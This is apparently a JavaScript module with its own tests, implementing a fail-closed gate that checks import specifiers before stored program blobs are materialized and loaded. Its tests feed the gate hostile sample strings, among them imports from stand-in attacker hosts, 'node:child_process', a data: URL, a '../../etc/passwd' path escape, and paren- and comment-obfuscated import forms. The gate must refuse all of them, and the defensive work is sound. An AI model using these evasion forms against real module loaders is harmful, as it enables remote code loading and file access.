/**
 * SEC-02, SEC-03, EXEC-08 and EXEC-09 — turning a stored blob into an
 * executable module without inheriting the ways that go wrong.
 *
 * Four separable concerns, kept separable because each fails differently:
 *
 * - **{@link checkSpecifiers} (SEC-02)** runs *before* materialization.
 *   After it, the check is worthless: `import()` evaluates the module body
 *   immediately, so by the time a module value exists, anything the blob
 *   wanted to do on load has already happened. REQUIREMENTS' accepted-risks
 *   section records that this happens with full Node privileges and that
 *   Node's permission model has no network permission — which is precisely
 *   why the specifier gate has to be the thing that runs first.
 * - **{@link programFileName} (SEC-03)** derives the filename from the
 *   content hash. Node's ESM cache is keyed by URL and never evicts, so a
 *   reused temp filename silently re-runs the *first* program: the second
 *   program's bytes are never executed and nothing reports an error. A
 *   hash-derived name makes that failure mode unreachable — two different
 *   programs cannot collide, and the same program deliberately does.
 * - **{@link materializeProgram} (EXEC-08's precondition)** is the fourth
 *   concern, added in Phase 7: actually writing a CAS blob's bytes to a real
 *   file at `programPath(materializeHome(home))(hash)`, which nothing in
 *   this repo did before now. `loadProgram` (below) has always *assumed*
 *   the file at its target path already exists — every Phase 6 proof
 *   exercised it under `fjs/effects/node/virtual` with a `JsModule` fixture
 *   standing in for "materialization already happened," never a real byte
 *   write. In production `home` is the project root, so without this write
 *   step (and without a dedicated subdirectory), a real `fjs_run` call would
 *   either fail to find the file or, once the write existed, would scatter
 *   untracked hash-named `.mjs` files across the repo root
 *   (07-CONTEXT.md's "Two gaps research surfaced", #2). `materializeDir`
 *   (`.fjs-run`) is a dedicated, `.gitignore`d sibling of `.cas` under
 *   `home`, and `materializeHome` is the only thing that changes:
 *   `programPath`'s own `(home)(hash)` contract is reused UNCHANGED by
 *   passing `materializeHome(home)` as its `home` argument.
 *
 *   `fjs/effects/node/virtual`'s `writeFile` stores a file as an array of
 *   `Vec` chunks, while `import_` requires the entry at its path to be a
 *   `JsModule` (a plain function) — verified by reading
 *   `node_modules/functionalscript/fjs/effects/node/virtual/module.f.mjs`
 *   directly. `virtual` has no JS parser and cannot execute freshly-written
 *   bytes as a module, so write-then-import cannot be composed in one
 *   virtual session; this module's own proof therefore verifies the write
 *   mechanism on its own terms (write, then read the same bytes back),
 *   while `underVirtual.cleanProgramImportsAndRuns` (below, unchanged)
 *   remains the evidence that import-from-a-materialized-path works, using
 *   its established `JsModule` stand-in for "materialization already
 *   succeeded." Real Node's `import()` reads whatever `writeFile` actually
 *   wrote to disk, so production performs both steps for real — Plan 06/09
 *   compose the two established techniques side by side rather than
 *   pretending `virtual` can do both in one call.
 * - **{@link loadProgram} (EXEC-09)** reaches `import()` through fjs's
 *   `import_` **effect** rather than as a raw expression, which is what
 *   makes the whole path proof-testable under `fjs/effects/node/virtual`
 *   with no filesystem at all.
 *
 * @module
 */
import { step, catchStep, pureError } from 'functionalscript/fjs/effects/module.f.mjs'
import { import_, mkdir, writeUtf8File, readUtf8File, errorMessage } from 'functionalscript/fjs/effects/node/module.f.mjs'
import { error, ok } from 'functionalscript/fjs/types/result/module.f.mjs'
import { join } from 'functionalscript/fjs/path/module.f.mjs'
import { emptyState, virtual } from 'functionalscript/fjs/effects/node/virtual/module.f.mjs'
import { assert, assertEq } from 'functionalscript/fjs/asserts/module.f.mjs'
import { guestCtx } from '../module.f.js'
import { interpret } from '../../exec/module.f.js'

/** @import { Effect, OperationMap } from 'functionalscript/fjs/effects/types.js' */
/** @import { Import, Module, Mkdir, WriteFile } from 'functionalscript/fjs/effects/node/types.js' */
/** @import { Result } from 'functionalscript/fjs/types/result/types.js' */
/** @import { CasOp, Report } from '../module.f.js' */

// ── SEC-02: the specifier allow-list ─────────────────────────────────────────

/**
 * The keywords a module specifier can follow in ESM source. `import` covers
 * the bare side-effect form, the bound form, and the dynamic call; `from`
 * covers the tail of `import … from 'x'` and of `export … from 'x'`.
 *
 * `export` is deliberately absent: every stored program exports its `report`
 * entry point, so anchoring on it would match constantly. An `export … from`
 * re-export is reached through its `from` instead.
 * @type {RegExp}
 */
const specifierKeyword = /\b(?:import|from)\b/g

/**
 * Whitespace, `// …` to end of line, and `/* … *\/` — everything that may sit
 * between a keyword and its specifier. Returns the index of the first
 * character that is none of those, or the end of input.
 * @type {(source: string, i: number) => number}
 */
const skipTrivia = (source, i) => {
    while (i < source.length) {
        const c = source[i]
        if (c === ' ' || c === '\t' || c === '\n' || c === '\r') { i += 1; continue }
        if (c !== '/') { return i }
        const next = source[i + 1]
        if (next === '/') {
            const end = source.indexOf('\n', i)
            if (end === -1) { return source.length }
            i = end + 1
            continue
        }
        if (next === '*') {
            const end = source.indexOf('*/', i + 2)
            if (end === -1) { return source.length }
            i = end + 2
            continue
        }
        return i
    }
    return i
}

/**
 * The complete `'`/`"`-quoted specifier starting at `i`, or `null` when what
 * is there is not one.
 *
 * "Complete" is the point: the quoted text is only the specifier if nothing
 * continues the expression after it. `import('node:' + 'fs')` starts with a
 * readable `'node:'`, and treating that as the specifier would check a string
 * the program never imports — so the character after the closing quote must
 * end the specifier (`)`, `;`, end of line, end of input, or a trailing
 * comment). Only spaces and tabs are skipped while looking for it; a newline
 * *is* one of the terminators.
 * @type {(source: string, i: number) => string | null}
 */
const quotedAt = (source, i) => {
    const quote = source[i]
    if (quote !== `'` && quote !== '"') { return null }
    const end = source.indexOf(quote, i + 1)
    if (end === -1) { return null }
    let j = end + 1
    while (source[j] === ' ' || source[j] === '\t') { j += 1 }
    const after = source[j]
    const terminated = after === undefined || after === ')' || after === ';'
        || after === '\n' || after === '\r' || after === '/'
    return terminated ? source.slice(i + 1, end) : null
}

/**
 * Whether `c` can start an import binding — `import x`, `import { x }`,
 * `import * as x`. Such an `import` names no specifier itself; the `from`
 * that follows does. `(` is excluded on purpose: that is a dynamic import,
 * whose specifier has to be readable right there.
 * @type {(c: string | undefined) => boolean}
 */
const isBindingStart = c =>
    c !== undefined && (c === '{' || c === '*' || c === '_' || c === '$'
        || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z'))

/**
 * Refuses a program whose source names any specifier outside `allowed`,
 * returning the source unchanged when it is clean and the offending
 * specifier when it is not.
 *
 * `allowed` is a parameter, and for a stored report program it is **empty**
 * — Success Criterion 2 requires zero imports in a blob, because a CAS blob
 * cannot resolve bare specifiers: there is no `node_modules` at a content
 * hash. An empty allow-list rejects `https://attacker/x.js` and `node:fs`
 * alike, which is exactly Criterion 3.
 *
 * It is written as an allow-list rather than as a hardcoded reject-all
 * because the parameter costs one line, and a function named for an
 * allow-list that cannot express one is a name that stops being true the
 * first time somebody needs it to.
 *
 * **The gate fails closed: anything it cannot read as a plain quoted
 * specifier is refused.** This is the whole design, and an earlier version
 * had it backwards. That version matched the specifier with a regular
 * expression requiring a quote to follow the keyword across whitespace only,
 * and *passed* whatever it failed to match — so `` await import(('node:fs')) ``
 * sailed through on a redundant paren, as did a comment in the same position
 * (`` import(/*x*\/'node:fs') ``, `` import fs from/*x*\/'node:fs' ``). None of
 * those needs any cleverness; they are ordinary JavaScript. A gate whose
 * failure mode is "allow" is not a gate.
 *
 * So each `import`/`from` keyword is resolved to exactly one of three answers:
 *
 * - it is followed by a plain `'`/`"`-quoted specifier — check that against
 *   `allowed`;
 * - it is `import` followed by a binding (`import x from …`, `import { x } …`,
 *   `import * as x …`) — no specifier here, the `from` that follows carries it;
 * - **anything else — refuse.** A backtick (`` import(`${x}`) ``) names a
 *   module whose text is assembled at import time and cannot be known by
 *   reading the source. A paren, an identifier, `import.meta.resolve(…)`, a
 *   call — each hides the specifier behind evaluation that happens after this
 *   gate has run. Since the gate exists precisely because everything after it
 *   is too late (see the module header), the only sound answer to a specifier
 *   it cannot read is to refuse: a gate that cannot decide must not pass.
 *
 * Scanning text rather than parsing costs some over-refusal: a `from` used as
 * an ordinary identifier (`const from = 1`) is refused, and so is an import
 * *statement* quoted inside a string or a comment. It is narrower than
 * "mentions the word", though — prose containing `import` is followed by
 * ordinary text rather than a specifier, so it reads as a binding with no
 * `from` and passes. All of it errs toward refusal, which is the direction
 * this gate is allowed to be wrong in, and none of it costs a stored report
 * program anything: such a program imports nothing at all.
 * @type {(allowed: readonly string[]) => (source: string) => Result<string, string>}
 */
export const checkSpecifiers = allowed => source => {
    for (const m of source.matchAll(specifierKeyword)) {
        const keyword = m[0]
        let i = skipTrivia(source, m.index + keyword.length)
        // `import ( 'x' )` is a call, and its parentheses may be redundant —
        // `import(('x'))` imports `'x'` too. Read through them so the specifier
        // is checked rather than missed.
        let call = false
        while (keyword === 'import' && source[i] === '(') {
            call = true
            i = skipTrivia(source, i + 1)
        }
        const specifier = quotedAt(source, i)
        if (specifier !== null) {
            if (!allowed.includes(specifier)) {
                return error(`import specifier not permitted: ${specifier}`)
            }
            continue
        }
        // `import` before a binding names no specifier; its `from` does. A
        // dynamic call has no such excuse — its specifier belongs right here.
        if (keyword === 'import' && !call && isBindingStart(source[i])) { continue }
        return error(
            `import specifier not permitted: \`${keyword}\` is not followed by a quoted specifier, so it cannot be checked statically`)
    }
    return ok(source)
}

// ── SEC-03: content-hash-derived filenames ───────────────────────────────────

/**
 * The filename a program with this content hash materializes under. The
 * hash is the CAS's own cBase32 content address, so distinctness of
 * filenames follows from content-addressing rather than from anything this
 * function does — content-to-hash is the CAS's job and is proven there
 * (Phase 5). What this function guarantees is that nothing else enters the
 * name: no counter, no timestamp, no PID. A counter-suffixed scheme would
 * satisfy "distinct programs get distinct names" while breaking the other
 * half of Criterion 4, and that half is the one SEC-03 exists for.
 *
 * `.mjs` because a blob is ESM and carries no `package.json` to declare it.
 * @type {(hash: string) => string}
 */
export const programFileName = hash => `${hash}.mjs`

/**
 * The full path a program materializes at, under `home`. Kept separate from
 * {@link programFileName} because `fjs/effects/node/virtual`'s `import_`
 * accepts only a single-segment path — verified: it returns
 * `error('no such file')` unless the parsed path has length 1 — so a proof
 * under `virtual` addresses the bare filename while a real run addresses
 * this.
 * @type {(home: string) => (hash: string) => string}
 */
export const programPath = home => hash => join(home, programFileName(hash))

// ── EXEC-08's precondition: writing the blob's bytes to a real file ──────────

/**
 * The dedicated subdirectory materialized programs live under, sibling to
 * `.cas` directly under the CAS/Evo store `home` — never a direct child of
 * `home` itself. Locked in 07-CONTEXT.md: the repo root stays clean and the
 * `.gitignore` rule (below) is deliberate rather than incidental. The OS
 * temp directory was rejected because it discards the project-local store
 * property Phase 2 established on purpose.
 * @type {string}
 */
export const materializeDir = '.fjs-run'

/**
 * The directory {@link materializeProgram} writes into. `programPath`'s
 * existing `(home)(hash)` contract is reused UNCHANGED by passing this
 * function's result as its `home` argument — `programPath` and
 * `programFileName` themselves are never altered.
 * @type {(home: string) => string}
 */
export const materializeHome = home => join(home, materializeDir)

/**
 * Writes a stored program's `source` bytes to
 * `programPath(materializeHome(home))(hash)`, ensuring the directory exists
 * first. This is the write step Pitfall 1 (07-RESEARCH.md) names: nothing
 * else in this repo has ever performed it, and {@link loadProgram} below has
 * always assumed the file at its target path already exists.
 *
 * `mkdir(..., { recursive: true })` runs UNCONDITIONALLY on every call, with
 * no existence check first — mirroring this module's own documented
 * "unconditional overwrite over check-then-write" convention for
 * {@link programFileName}: the target directory is fixed and idempotent to
 * create, so a check-then-create step would only add a race against a
 * concurrent call for a different hash, never prevent one.
 *
 * The write itself is also an unconditional overwrite, for the same reason
 * `programFileName` is content-hash-derived: the SAME hash always names the
 * SAME bytes, so calling this twice with the same `hash`/`source` is
 * idempotent by construction — there is nothing a check could refuse that
 * the hash does not already guarantee is identical.
 *
 * Re-tags the two writes' `IoChannel` into this project's `string` error
 * channel, so a caller never sees a raw thrown value or an unconverted
 * upstream error type cross this function's boundary. **The failure is in
 * the channel, not the payload** (0.46.0): `step` short-circuits the write
 * when the `mkdir` failed, which is what the hand-written
 * `if (mkdirResult[0] === 'error')` used to do, and the one `catchStep`
 * renders both failures where both used to be rendered separately.
 *
 * **`errorMessage`, not `errorSummary`, and the choice is not free.** At
 * 0.43.1 an `IoError` was the host's message and `String(e)` produced it;
 * `errorMessage` is that same value under 0.46.0's tagged channel, so the
 * text a caller sees is unchanged and
 * `fjs/server`'s `weekOneConvergence` leaf still reads `invalid file` out of
 * it. `errorSummary` would be the safer rendering — upstream's own docstring
 * explains that `payload.message` carries the absolute path the host could
 * not touch, and this string reaches an MCP client through `fjs_run`'s error
 * response. Behaviour is preserved here rather than changed inside a
 * migration; the boundary question is written up in
 * `fjs/todo/mcp-error-text-forwards-host-messages.md`.
 * @type {(home: string) => (hash: string) => (source: string) => Effect<Mkdir | WriteFile, void, string>}
 */
export const materializeProgram = home => hash => source => {
    const dir = mkdir(materializeHome(home), { recursive: true })
    const written = step(dir, () => writeUtf8File(programPath(materializeHome(home))(hash), source))
    return catchStep(written, e => pureError(errorMessage(e)))
}

// ── EXEC-09: import through the effect, never a raw expression ───────────────

/**
 * Loads a materialized program: the specifier gate first, then `import_` on
 * the given path. Returns the module, or the refusal that stopped it.
 *
 * `path` is a parameter rather than being derived here so the gate ordering
 * stays visible and testable: the whole point of SEC-02 is that the check
 * happens before anything is imported, and a function that computed its own
 * path would let that ordering be rearranged without the signature changing.
 *
 * No raw `import(...)` expression appears anywhere in this module (EXEC-09)
 * — `import_` is an operation, so the entire path runs under `virtual` with
 * no filesystem.
 * @type {(allowed: readonly string[]) => (path: string) => (source: string) => Effect<Import, Module, string>}
 */
export const loadProgram = allowed => path => source => {
    const [t, v] = checkSpecifiers(allowed)(source)
    if (t === 'error') {
        return pureError(v)
    }
    return catchStep(import_(path), e => pureError(`import failed: ${String(e)}`))
}

// ── Tests ────────────────────────────────────────────────────────────────────

/** A program written the way Criterion 2 requires: ctx only, zero imports. */
const cleanSource = 'export const report = ctx => args => ctx.casRead(args[0])'

/**
 * The `report` entry point a materialized module exposes — the runtime
 * counterpart of {@link cleanSource}, used as the JsModule fixture's export
 * so the proof exercises a real entry point rather than an empty object.
 * @type {Report<string>}
 */
const guestReport = ctx => args => ctx.casRead(args[0] ?? '')

/** A host map for the frozen vocabulary, so a loaded program can be RUN. */
/** @type {OperationMap<CasOp, Result<string, string>>} */
const hostMap = {
    casRead: a => ok(`casRead:${a}`),
    evoList: a => ok(`evoList:${a}`),
    evoHead: a => ok(`evoHead:${a}`),
    evoRevision: a => ok(`evoRevision:${a}`),
}

export const proof = {
    // ── Success Criterion 3 ─────────────────────────────────────────────
    specifiers: {
        // The two the criterion names by hand.
        remoteUrlRejected: () => {
            const [t, v] = checkSpecifiers([])(`const m = await import('https://attacker/x.js')`)
            assertEq(t, 'error')
            assert(String(v).includes('https://attacker/x.js'), String(v))
        },
        nodeBuiltinRejected: () => {
            const [t, v] = checkSpecifiers([])(`import fs from 'node:fs'`)
            assertEq(t, 'error')
            assert(String(v).includes('node:fs'), String(v))
        },
        // The forms an attacker would reach for once the obvious two are
        // closed: a bare side-effect import, a re-export, a data: URL, and a
        // relative path escaping the store.
        otherSpecifierFormsRejected: () => {
            for (const src of [
                `import 'node:child_process'`,
                `export { x } from 'https://evil/y.js'`,
                `await import("data:text/javascript,globalThis.x=1")`,
                `import x from '../../etc/passwd'`,
            ]) {
                assertEq(checkSpecifiers([])(src)[0], 'error')
            }
        },
        // A dynamic `import()` may quote its specifier with a backtick, and a
        // template literal may interpolate — so its text is not knowable by
        // reading the source at all. Neither form can be checked against an
        // allow-list, so both are refused outright rather than parsed: a gate
        // that cannot decide must not pass.
        templateLiteralSpecifierRejected: () => {
            for (const src of [
                'await import(`node:fs`)',
                'await import(`${globalThis.pick()}`)',
                'export { x } from `https://evil/y.js`',
            ]) {
                assertEq(checkSpecifiers([])(src)[0], 'error')
            }
        },
        // The forms that defeated the regex this gate replaced. None needs any
        // cleverness — `import(('node:fs'))` is ordinary JavaScript, and the
        // rest are a comment in a position the pattern could not see past.
        // They passed because that gate's failure mode was "allow"; they are
        // refused now because this one's is "refuse".
        unreadableSpecifierPositionsRejected: () => {
            for (const src of [
                `await import(('node:fs'))`,
                `await import(  (  ( 'node:fs' ) )  )`,
                `await import(/*x*/'node:fs')`,
                'await import(//x\n\'node:fs\')',
                `import fs from/*x*/'node:fs'`,
                `await import/*x*/('node:fs')`,
                `await import(import.meta.resolve('node:fs'))`,
                `const m = await import(g ? 'a' : 'b')`,
            ]) {
                assertEq(checkSpecifiers([])(src)[0], 'error')
            }
        },
        // A specifier the gate can read only part of is not a specifier it can
        // check: `'node:'` is what the source shows, `'node:fs'` is what gets
        // imported. Checking the readable prefix against the allow-list would
        // be checking a string the program never uses, so the concatenation is
        // refused outright — including when its prefix IS allowed.
        concatenatedSpecifierRejectedEvenWhenPrefixIsAllowed: () => {
            const src = `await import('node:' + 'fs')`
            assertEq(checkSpecifiers([])(src)[0], 'error')
            assertEq(checkSpecifiers(['node:'])(src)[0], 'error')
        },
        // A program that imports nothing passes — the gate rejects
        // specifiers, not programs.
        cleanProgramAccepted: () => {
            const [t, v] = checkSpecifiers([])(cleanSource)
            assert(t === 'ok', ['expected ok', t, v])
            assertEq(v, cleanSource)
        },
        // The allow-list is a real allow-list, not a reject-all wearing the
        // name: the same specifier passes when it is listed. All three forms
        // that carry a readable specifier reach the list — the static one via
        // its `from`, the dynamic one directly, and the dynamic one through
        // redundant parens, which is the form that used to be invisible.
        allowListActuallyAllows: () => {
            for (const src of [
                `import x from 'permitted-thing'`,
                `await import('permitted-thing')`,
                `await import(('permitted-thing'))`,
            ]) {
                assertEq(checkSpecifiers([])(src)[0], 'error')
                assertEq(checkSpecifiers(['permitted-thing'])(src)[0], 'ok')
            }
        },
        // Scanning text rather than parsing costs some over-refusal, recorded
        // here rather than left to be discovered. All of it errs toward
        // refusal — the one direction this gate is allowed to be wrong in —
        // and none of it costs a stored report program anything, since such a
        // program imports nothing at all.
        knownOverRefusals: () => {
            for (const src of [
                `const from = 1`,                       // `from` as an identifier
                `// import 'node:fs'`,                  // an import statement inside a comment
                `const s = "import 'node:fs'"`,         // …and inside a string
            ]) {
                assertEq(checkSpecifiers([])(src)[0], 'error')
            }
        },
        // The over-refusal is narrower than "mentions the word": prose that
        // happens to contain `import` is followed by ordinary text, not by a
        // specifier, so it reads as a binding with no `from` and passes. Worth
        // pinning — it is the difference between a gate that is merely strict
        // and one that rejects the comments people write.
        proseMentionOfImportIsNotRefused: () => {
            assertEq(checkSpecifiers([])(`// we do not import anything here`)[0], 'ok')
        },
    },

    // ── Success Criterion 4 ─────────────────────────────────────────────
    filenames: {
        // Half one: two distinct programs never collide.
        distinctHashesGiveDistinctNames: () => {
            assert(
                programFileName('AAAA') !== programFileName('BBBB'),
                'two content hashes must not share a materialization name')
        },
        // Half two, and the one a counter-suffix scheme silently breaks:
        // the SAME hash must give the SAME name, because that identity is
        // what lets Node's URL-keyed, never-evicting ESM cache reuse the
        // module instead of re-running the first program under a reused
        // name. Proving only half one would pass for `${hash}-${n}.mjs`.
        sameHashIsStable: () => {
            assertEq(programFileName('AAAA'), programFileName('AAAA'))
        },
        // Nothing but the hash enters the name — no counter, no clock, no
        // PID. Asserted by construction rather than by inspecting the string
        // for things that are absent.
        nameIsExactlyTheHash: () => {
            assertEq(programFileName('AAAA'), 'AAAA.mjs')
            assert(programPath('/store')('AAAA').endsWith('AAAA.mjs'), programPath('/store')('AAAA'))
        },
    },

    // ── EXEC-08's precondition — the new disk-materialization write step ────
    // Under `fjs/effects/node/virtual`'s REAL `Fs` operation set (`mkdir`,
    // `writeFile`, `readFile`) — never a `JsModule` fixture, which is what
    // `underVirtual` below exercises for a DIFFERENT concern (import). The
    // module header explains why write-then-import cannot be composed in one
    // virtual session; this proves the write mechanism on its own terms.
    materialize: {
        // The write-then-readback equality the plan's acceptance criteria
        // name directly: starting from an empty root, the exact bytes that
        // went in via materializeProgram come back out via readUtf8File at
        // the SAME path.
        writeThenReadbackEqualsSource: () => {
            const home = '/store'
            const hash = 'CONTENTHASH'
            const source = cleanSource
            const [state] = virtual(emptyState)(materializeProgram(home)(hash)(source))
            const [, readResult] = virtual(state)(readUtf8File(programPath(materializeHome(home))(hash)))
            assert(readResult[0] === 'ok', ['expected the materialized file to read back', readResult])
            assertEq(readResult[1], source)
        },
        // The materialized path is a child of materializeHome, never a
        // direct child of home itself (07-CONTEXT.md Decision 2).
        pathIsUnderTheDedicatedSubdirectory: () => {
            const path = programPath(materializeHome('/x'))('H')
            assert(path.startsWith('/x/.fjs-run'), path)
        },
        // Calling materializeProgram twice with the SAME hash and SAME
        // source is idempotent: no error on the second call, and the
        // readback afterward still equals source — the unconditional
        // mkdir/overwrite convention this module documents elsewhere.
        sameHashSameSourceIsIdempotent: () => {
            const home = '/store'
            const hash = 'CONTENTHASH'
            const source = cleanSource
            const [state1, first] = virtual(emptyState)(materializeProgram(home)(hash)(source))
            assert(first[0] === 'ok', ['expected the first materialize to succeed', first])
            const [state2, second] = virtual(state1)(materializeProgram(home)(hash)(source))
            assert(second[0] === 'ok', ['expected the second materialize to succeed too', second])
            const [, readResult] = virtual(state2)(readUtf8File(programPath(materializeHome(home))(hash)))
            assert(readResult[0] === 'ok', ['expected readback after the second call to succeed', readResult])
            assertEq(readResult[1], source)
        },
    },

    // ── Success Criterion 5 ─────────────────────────────────────────────
    // The whole materialize-and-run path under `fjs/effects/node/virtual`,
    // with a `JsModule` at the CAS path and NO real filesystem. `import_` is
    // an operation, so `virtual` interprets it like any other — which is the
    // entire reason EXEC-09 insists on the effect rather than a raw
    // `import(...)` expression, which no interpreter can intercept.
    underVirtual: {
        cleanProgramImportsAndRuns: () => {
            const hash = 'CONTENTHASH'
            const name = programFileName(hash)
            // The materialized module, placed at the hash-derived path. A
            // JsModule is a function so `virtual` can tell it from a Vec.
            const root = { [name]: () => ({ report: guestReport }) }
            const [, result] = virtual({ ...emptyState, root })(loadProgram([])(name)(cleanSource))
            const [t, v] = result
            assert(t === 'ok', ['expected the module to load', t, v])
            // It is the module we placed — and its entry point actually
            // RUNS, composed only from the frozen ctx and interpreted by
            // Phase 3's interpreter. Asserting the export is a function
            // would prove the fixture was returned; running it proves the
            // materialize -> import -> execute path end to end.
            const loaded = /** @type {{ readonly report: Report<string> }} */ (v)
            const [rt, rv] = interpret(hostMap)(loaded.report(guestCtx)(['abc']))
            assert(rt === 'ok', ['expected the loaded program to run', rt, rv])
            assertEq(rv[0], 'casRead:abc')
        },
        // The gate runs BEFORE `import_`, and the ONLY thing that
        // distinguishes the two orderings is whether the module body ran.
        //
        // An earlier version of this leaf asserted that a dirty source
        // produced a specifier message rather than an import error. That
        // proved nothing: the module at this path loads fine, so BOTH
        // orderings end in the specifier message. Moving the check after
        // `import_` left the suite fully green — the guarantee was
        // decorative until this leaf was rewritten.
        //
        // A JsModule is a function `virtual` invokes on import, and
        // upstream's own docstring notes the fixture may close over state
        // for exactly this purpose. So the fixture records its own
        // invocation: if the gate ran first, the body was never evaluated.
        // That is the real security property — after `import()`, whatever
        // the blob wanted to do on load has already happened.
        dirtySourceIsRefusedWithoutEvaluatingTheModuleBody: () => {
            const name = programFileName('CONTENTHASH')
            /** @type {{ evaluated: boolean }} */
            const spy = { evaluated: false }
            const root = {
                [name]: () => {
                    spy.evaluated = true
                    return { report: guestReport }
                },
            }
            const dirty = `import fs from 'node:fs'\n${cleanSource}`
            const [, result] = virtual({ ...emptyState, root })(loadProgram([])(name)(dirty))
            const [t, v] = result
            assertEq(t, 'error')
            assert(String(v).includes('node:fs'), String(v))
            // The point of SEC-02, in one assertion.
            assertEq(spy.evaluated, false)
        },
        // The control: the same fixture DOES evaluate for a clean source,
        // so the assertion above is about the gate, not about a spy that
        // never fires.
        cleanSourceDoesEvaluateTheModuleBody: () => {
            const name = programFileName('CONTENTHASH')
            /** @type {{ evaluated: boolean }} */
            const spy = { evaluated: false }
            const root = {
                [name]: () => {
                    spy.evaluated = true
                    return { report: guestReport }
                },
            }
            const [, result] = virtual({ ...emptyState, root })(loadProgram([])(name)(cleanSource))
            assertEq(result[0], 'ok')
            assertEq(spy.evaluated, true)
        },
        // A missing module is an error value, not a throw — the same
        // discipline Phase 3 locked for refusals.
        missingModuleIsAnErrorValue: () => {
            const [, result] = virtual({ ...emptyState, root: {} })(
                loadProgram([])(programFileName('ABSENT'))(cleanSource))
            assertEq(result[0], 'error')
        },
    },
}
